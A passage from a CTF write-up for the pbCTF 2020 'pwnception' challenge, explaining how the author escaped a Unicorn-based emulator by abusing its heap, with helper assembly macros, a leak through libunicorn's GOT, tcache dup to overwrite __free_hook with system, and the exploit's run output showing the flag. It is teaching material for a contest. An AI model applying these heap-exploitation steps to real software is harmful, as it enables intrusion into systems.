The first thing to note is that the emulator's allocator does not use the glibc heap region of memory. A pointer to the chunk you allocate will be stored `PIE_base + 0x1a061e0`, so using GDB, you can find its address and view it. I found it useful to set a breakpoint on `exit` to view the state of the heap after our shellcode runs.

Even though it doesn't use the glibc heap memory region, it does use the glibc malloc / free. We're given the `libc.so.6` file, so we know that its libc 2.27, which has the tcache enabled (with the new mitigations).

One other thing I had an issue with was when doing a UAF write to overwrite the `fd` of a freed chunk. The emulator kept crashing any time I did that and let it continue running. I spent like 4-5 hours debugging this, and gave up at 4am.

The problem was that once the kernel thread stops, `__libc_thread_freeres` is called by the emulator, which will free each chunk on the heap. The way it does this is it follows every freed chunk's `fd` pointer and calls `free` on it (no idea how that works lol). If you've overwritten the `fd` pointer to point to some memory region that doesn't have a valid chunk header, all sorts of things can go wrong when this fake chunk is freed. I think I saw 4 different `malloc.c` error messages in total. It took me way too long to figure out that I should just complete my exploit and ignore the crash.

## Helper code / macros

First, I defined some helper macros in the pwntools `asm()` syntax as follows:

```python
kshellcode = asm(r"""                                                           
;// macro to call malloc in the emulator                                        
#define malloc(size)\                                                           
mov rax, 0;\                                                                    
mov rdi, size;\                                                                 
int 0x71;                                                                       
                                                                                
;// macro to call free in the emulator                                          
#define free()\                                                                 
mov rax, 3;\                                                                    
int 0x71;                                                                       
                                                                                
;// macro to read from the currently allocated chunk into `addr`
#define read(addr, size)\                                                       
mov rax, 2;\                                                                    
mov rdi, addr;\                                                                 
mov rsi, size;\                                                                 
int 0x71;                                                                       
                                                                                
;// macro to write the contents of `addr` into the currently allocated chunk
#define write(addr, size)\                                                      
mov rax, 1;\                                                                    
mov rdi, addr;\                                                                 
mov rsi, size;\                                                                 
int 0x71;

bin_sh:                                                                         
.asciz "/bin/sh"                                                                
recv_until:                                                                     
.asciz "special_string\n"
""")
``` 

I also found the following bit of assembly useful. I essentially used it to output contents of memory to stdout so I could see what was going on:

```nasm
;// Print out the special string, we can recv until on this
lea rsi, [rip+recv_until]                                                       
mov rcx, 15                                                                     
mov dx, 0x38f                                                                   
rep outsb                                                                       

;// Replace 0x7ffffff00000 with any address. The contents will be printed out.
;// Note that dx is set to 0x38f from above. If you change it you will need to
;// reset it to 0x38f                                                                        
mov rsi, 0x7ffffff00000                                                         
mov rcx, 0x100                                                                  
rep outsb
```

With those out of the way, lets get to the actual attack.

## Tcache dup through shellcode

First, we need a libc leak. As a pwner, you may already have the idea to allocate a `0x420` sized chunk, free it, and read the first 8 bytes to leak the unsorted bin, but this won't work.

Remember that the allocator does not use the glibc memory region. This also means that there are no libc pointers in the heap. So, how do we leak a libc address?

Through trial and error, I found that when you allocate a `0x20` chunk and then free it, there is an address at `chunk[0x88]` that points to somewhere in `libunicorn.so.1`. If you subtract `0x1b406` from this address, you get to the base of `libunicorn.so.1`.

Lucky for us, `libunicorn` actually has a GOT, so we can leak this address, tcache dup to the GOT of `libunicorn`, and then leak a libc address that way. I chose to leak the address of `vasprintf`.

Once this is done, I calculate the address of `system@LIBC` and `__free_hook`, and then tcache dup again to overwrite `__free_hook` with `&system`. Then, I just allocate another chunk, set its contents to `"/bin/sh"`, and then free it to get a shell.

This part is very self-explanatory except the `libunicorn` leak part, but I would suggest you use GDB + the helper assembly code above to see your chunk's contents after it's freed.

# The end

[You can find the final exploit script here](https://github.com/Super-Guesser/ctf/blob/master/pbCTF2020/pwn/pwnception/exploit.py).

```
$ ./exploit.py 
[+] Opening connection to pwnception.chal.perfect.blue on port 1: Done
[*] Switching to interactive mode
\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x82\x8c cannot be opened
pbctf{pwn1n6_fr0m_th3_b0770m_t0_th3_t0p}
```
